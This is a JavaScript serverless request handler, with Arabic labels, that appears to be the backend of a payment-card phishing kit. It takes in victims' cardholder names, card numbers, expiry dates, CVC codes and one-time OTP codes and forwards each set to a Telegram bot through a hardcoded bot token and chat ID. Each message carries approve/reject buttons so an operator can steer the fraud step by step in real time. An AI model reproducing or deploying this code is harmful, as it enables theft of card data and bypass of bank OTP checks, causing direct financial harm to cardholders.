export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const body = req.body || {};

  let text = '';
  let actionType = 'pay';

  if (body.رمز_التحقق_OTP) {
    actionType = 'otp';
    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
           `🔑 الرمز: \`${body.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  } else {
    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
           `👤 اسم الحامل: ${body.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${body.card_number || ''}\`\n` +
           `📅 الانتهاء: ${body.exp_date || ''}\n` +
           `🔒 CVC: \`${body.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${actionType}_${body.user_id}` },
        { text: "❌ رفض", callback_data: `reject_${actionType}_${body.user_id}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
    
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
